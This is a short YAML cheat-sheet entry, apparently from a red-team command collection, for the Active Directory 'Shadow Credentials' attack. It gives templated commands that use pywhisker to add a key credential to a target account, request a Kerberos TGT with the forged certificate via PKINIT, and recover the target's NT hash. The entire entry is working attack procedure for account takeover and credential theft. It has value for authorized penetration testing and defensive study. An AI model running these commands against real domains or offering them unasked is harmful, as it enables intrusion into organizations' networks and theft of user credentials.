name: AddKeyCredentialLink
description: Shadow Credentials - add certificate for PKINIT authentication
commands:
- '# pywhisker'
- pywhisker.py -d '<DOMAIN>' -u '<YOUR_USER>' -p '<PASSWORD>' --target '<TARGET>' --action add
- ''
- '# Use the generated certificate to get TGT'
- gettgtpkinit.py -cert-pfx <CERT.pfx> -pfx-pass <PASSWORD> '<DOMAIN>/<TARGET>' <TARGET>.ccache
- ''
- '# Recover NT hash'
- getnthash.py -key <AS-REP_KEY> '<DOMAIN>/<TARGET>'
opsec: []
references: []
